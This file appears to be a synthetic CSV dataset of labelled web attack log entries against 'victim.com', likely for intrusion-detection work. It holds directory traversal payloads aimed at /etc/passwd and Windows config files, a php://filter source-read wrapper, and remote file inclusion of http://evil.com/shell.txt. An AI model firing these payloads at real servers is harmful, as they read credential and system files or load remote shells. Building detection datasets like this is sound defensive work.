id,timestamp,src_ip,dst_ip,method,url,attack_type,payload,is_successful,user_agent,notes
283,2025-11-15 15:06:56.531974,192.168.22.38,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,curl/7.88,
284,2025-12-05 01:59:56.531980,192.168.160.6,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
285,2025-11-13 01:09:56.531985,192.168.134.49,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,curl/7.88,
286,2025-11-08 20:20:56.531990,192.168.124.220,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,SQLmap/1.5,
287,2025-12-02 14:11:56.531996,192.168.60.113,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,SQLmap/1.5,
288,2025-11-28 05:30:56.532001,192.168.249.36,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
289,2025-12-03 06:54:56.532007,192.168.150.112,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,curl/7.88,
290,2025-12-08 04:40:56.532013,192.168.216.52,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,curl/7.88,
291,2025-11-23 20:01:56.532019,192.168.251.104,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,SQLmap/1.5,
292,2025-12-04 01:50:56.532025,192.168.34.112,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,curl/7.88,
293,2025-11-27 00:48:56.532031,192.168.48.220,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,curl/7.88,
294,2025-11-22 19:21:56.532036,192.168.135.59,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,Mozilla/5.0,
295,2025-11-30 03:13:56.532042,192.168.54.210,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,Mozilla/5.0,
296,2025-11-26 22:02:56.532047,192.168.220.122,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
297,2025-11-17 03:43:56.532052,192.168.111.160,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,SQLmap/1.5,
298,2025-11-19 07:31:56.532058,192.168.44.78,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
299,2025-12-09 09:04:56.532063,192.168.47.49,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
300,2025-11-10 12:28:56.532068,192.168.154.202,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,curl/7.88,
301,2025-11-21 06:57:56.532074,192.168.106.46,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
302,2025-11-07 04:29:56.532080,192.168.4.223,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,SQLmap/1.5,
303,2025-11-17 10:41:56.532086,192.168.82.247,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
304,2025-11-15 05:53:56.532091,192.168.62.228,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,curl/7.88,
305,2025-12-07 16:05:56.532097,192.168.219.89,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,SQLmap/1.5,
306,2025-11-24 17:13:56.532102,192.168.172.7,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,Mozilla/5.0,
307,2025-12-08 19:58:56.532107,192.168.225.244,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
308,2025-11-25 06:18:56.532113,192.168.158.174,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
309,2025-12-04 13:02:56.532120,192.168.13.222,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,Mozilla/5.0,
310,2025-12-06 10:21:56.532130,192.168.247.150,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,curl/7.88,
311,2025-12-06 08:55:56.532140,192.168.141.49,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,Mozilla/5.0,
312,2025-11-24 18:14:56.532151,192.168.201.94,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,curl/7.88,
313,2025-11-26 20:14:56.532162,192.168.154.4,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,SQLmap/1.5,
314,2025-12-07 07:42:56.532171,192.168.96.106,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,SQLmap/1.5,
315,2025-11-22 15:01:56.532180,192.168.208.122,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
316,2025-11-29 04:21:56.532188,192.168.87.108,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,Mozilla/5.0,
317,2025-11-30 06:42:56.532197,192.168.107.23,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,SQLmap/1.5,
318,2025-12-05 23:45:56.532206,192.168.70.161,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,SQLmap/1.5,
319,2025-11-25 12:38:56.532215,192.168.130.191,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,Mozilla/5.0,
320,2025-11-28 17:50:56.532224,192.168.184.117,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,SQLmap/1.5,
321,2025-11-20 07:15:56.532234,192.168.206.27,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,Mozilla/5.0,
322,2025-12-03 19:41:56.532246,192.168.105.198,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,Mozilla/5.0,
323,2025-11-12 23:22:56.532252,192.168.146.178,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,SQLmap/1.5,
324,2025-11-16 00:17:56.532257,192.168.183.31,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,curl/7.88,
325,2025-11-18 16:00:56.532262,192.168.31.154,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,curl/7.88,
326,2025-12-09 15:35:56.532268,192.168.97.1,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
327,2025-11-30 10:35:56.532273,192.168.233.92,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
328,2025-12-09 06:43:56.532278,192.168.203.215,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,curl/7.88,
329,2025-11-14 16:39:56.532284,192.168.212.134,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,SQLmap/1.5,
330,2025-12-07 08:55:56.532289,192.168.167.178,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,SQLmap/1.5,
331,2025-11-27 18:08:56.532294,192.168.34.14,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,SQLmap/1.5,
332,2025-12-04 08:55:56.532301,192.168.50.77,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,curl/7.88,
333,2025-11-16 05:25:56.532307,192.168.61.96,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,Mozilla/5.0,
334,2025-11-08 07:13:56.532313,192.168.228.239,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,curl/7.88,
335,2025-11-30 10:45:56.532318,192.168.67.167,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
336,2025-11-21 10:17:56.532323,192.168.55.150,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
337,2025-12-08 08:49:56.532328,192.168.49.43,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,SQLmap/1.5,
338,2025-11-15 08:46:56.532334,192.168.76.81,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
339,2025-12-04 06:24:56.532339,192.168.163.33,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,Mozilla/5.0,
340,2025-12-02 13:01:56.532345,192.168.238.109,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,Mozilla/5.0,
341,2025-11-22 10:42:56.532350,192.168.226.55,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
342,2025-11-17 21:33:56.532356,192.168.149.130,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,Mozilla/5.0,
343,2025-12-06 20:50:56.532363,192.168.126.88,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
344,2025-11-22 16:24:56.532368,192.168.198.201,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,curl/7.88,
345,2025-12-02 02:41:56.532373,192.168.71.221,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,SQLmap/1.5,
346,2025-12-05 19:27:56.532379,192.168.228.80,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,SQLmap/1.5,
347,2025-11-30 18:01:56.532384,192.168.82.106,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,Mozilla/5.0,
348,2025-11-14 21:40:56.532389,192.168.80.238,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,SQLmap/1.5,
349,2025-12-09 05:49:56.532394,192.168.148.37,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
350,2025-11-12 17:18:56.532400,192.168.211.218,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
351,2025-12-06 11:31:56.532405,192.168.99.229,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,SQLmap/1.5,
352,2025-11-28 17:10:56.532411,192.168.224.116,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
353,2025-11-11 22:46:56.532418,192.168.202.235,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,curl/7.88,
354,2025-11-18 17:31:56.532424,192.168.6.80,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,curl/7.88,
355,2025-12-03 21:00:56.532430,192.168.107.121,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,curl/7.88,
356,2025-11-12 05:34:56.532435,192.168.164.254,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,Mozilla/5.0,
357,2025-11-13 21:19:56.532440,192.168.112.193,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,curl/7.88,
358,2025-11-24 13:08:56.532445,192.168.219.130,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,SQLmap/1.5,
359,2025-11-21 22:03:56.532451,192.168.186.132,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,False,curl/7.88,
360,2025-11-09 05:11:56.532456,192.168.113.186,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,curl/7.88,
361,2025-11-27 00:33:56.532461,192.168.146.231,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,curl/7.88,
362,2025-11-19 05:47:56.532467,192.168.209.37,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,True,Mozilla/5.0,
363,2025-11-28 22:25:56.532473,192.168.118.175,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
364,2025-11-07 00:55:56.532479,192.168.59.158,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,SQLmap/1.5,
365,2025-12-09 15:12:56.532484,192.168.15.52,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,curl/7.88,
366,2025-12-10 09:11:56.532490,192.168.113.38,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,SQLmap/1.5,
367,2025-11-11 18:31:56.532495,192.168.80.117,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,SQLmap/1.5,
368,2025-12-06 07:28:56.532500,192.168.255.251,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,SQLmap/1.5,
369,2025-11-10 03:49:56.532506,192.168.40.253,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,SQLmap/1.5,
370,2025-11-07 21:53:56.532511,192.168.255.111,192.168.1.20,POST,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,Mozilla/5.0,
371,2025-11-19 19:23:56.532516,192.168.177.197,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,curl/7.88,
372,2025-11-07 08:20:56.532523,192.168.19.181,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,curl/7.88,
373,2025-11-21 15:12:56.532528,192.168.190.27,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
374,2025-11-22 03:37:56.532534,192.168.141.121,192.168.1.20,GET,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,Mozilla/5.0,
375,2025-12-01 02:07:56.532539,192.168.195.94,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,True,SQLmap/1.5,
376,2025-11-29 08:15:56.532544,192.168.217.61,192.168.1.20,GET,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,SQLmap/1.5,
377,2025-11-25 09:22:56.532551,192.168.5.89,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,SQLmap/1.5,
378,2025-11-08 22:38:56.532556,192.168.65.180,192.168.1.20,POST,http://victim.com/scan?input=../../../../../../boot.ini,DIRECTORY_TRAVERSAL,../../../../../../boot.ini,False,SQLmap/1.5,
379,2025-11-26 21:28:56.532561,192.168.55.82,192.168.1.20,POST,http://victim.com/scan?input=../../../windows/system32/config,DIRECTORY_TRAVERSAL,../../../windows/system32/config,False,curl/7.88,
380,2025-11-23 23:11:56.532567,192.168.166.107,192.168.1.20,GET,http://victim.com/scan?input=../../etc/passwd,DIRECTORY_TRAVERSAL,../../etc/passwd,True,curl/7.88,
381,2025-11-18 01:16:56.532574,192.168.105.69,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,curl/7.88,
382,2025-11-13 04:31:56.532580,192.168.230.111,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,SQLmap/1.5,
383,2025-11-12 16:23:56.532586,192.168.111.70,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
384,2025-11-09 13:38:56.532591,192.168.214.225,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,curl/7.88,
385,2025-12-10 17:54:56.532598,192.168.215.45,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,SQLmap/1.5,
386,2025-11-09 06:59:56.532604,192.168.240.151,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,SQLmap/1.5,
387,2025-11-29 03:10:56.532609,192.168.41.130,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
388,2025-11-12 10:56:56.532614,192.168.218.252,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,SQLmap/1.5,
389,2025-11-17 18:43:56.532620,192.168.72.99,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,SQLmap/1.5,
390,2025-11-17 10:52:56.532625,192.168.212.239,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,Mozilla/5.0,
391,2025-11-14 01:28:56.532630,192.168.91.24,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,SQLmap/1.5,
392,2025-12-04 11:04:56.532636,192.168.23.154,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,curl/7.88,
393,2025-12-11 04:36:56.532643,192.168.0.22,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
394,2025-11-22 14:33:56.532648,192.168.199.60,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
395,2025-11-20 09:30:56.532653,192.168.203.185,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,curl/7.88,
396,2025-11-15 01:36:56.532659,192.168.126.95,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,SQLmap/1.5,
397,2025-11-06 22:14:56.532664,192.168.80.52,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,Mozilla/5.0,
398,2025-11-21 01:27:56.532669,192.168.19.41,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,Mozilla/5.0,
399,2025-11-23 08:48:56.532674,192.168.137.179,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,SQLmap/1.5,
400,2025-11-24 02:32:56.532680,192.168.225.76,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,SQLmap/1.5,
401,2025-11-14 18:53:56.532686,192.168.182.222,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,SQLmap/1.5,
402,2025-11-26 16:20:56.532693,192.168.110.193,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,curl/7.88,
403,2025-11-22 11:53:56.532698,192.168.196.223,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
404,2025-11-28 10:18:56.532704,192.168.165.2,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,Mozilla/5.0,
405,2025-12-06 01:43:56.532709,192.168.247.183,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,SQLmap/1.5,
406,2025-11-24 13:54:56.532731,192.168.191.177,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
407,2025-11-30 02:33:56.532737,192.168.128.63,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
408,2025-12-09 19:53:56.532743,192.168.6.157,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,SQLmap/1.5,
409,2025-11-10 00:46:56.532748,192.168.25.19,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
410,2025-11-23 23:11:56.532753,192.168.0.187,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
411,2025-11-30 14:54:56.532758,192.168.65.22,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,SQLmap/1.5,
412,2025-11-29 01:46:56.532765,192.168.127.42,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,SQLmap/1.5,
413,2025-11-09 21:17:56.532770,192.168.91.234,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,curl/7.88,
414,2025-11-16 10:35:56.532776,192.168.22.119,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,curl/7.88,
415,2025-11-17 18:35:56.532782,192.168.5.56,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,Mozilla/5.0,
416,2025-12-09 14:57:56.532789,192.168.35.103,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,SQLmap/1.5,
417,2025-11-08 20:14:56.532795,192.168.150.17,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
418,2025-11-11 03:49:56.532801,192.168.221.95,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,curl/7.88,
419,2025-11-16 11:50:56.532806,192.168.211.245,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,Mozilla/5.0,
420,2025-11-26 00:31:56.532811,192.168.233.108,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,SQLmap/1.5,
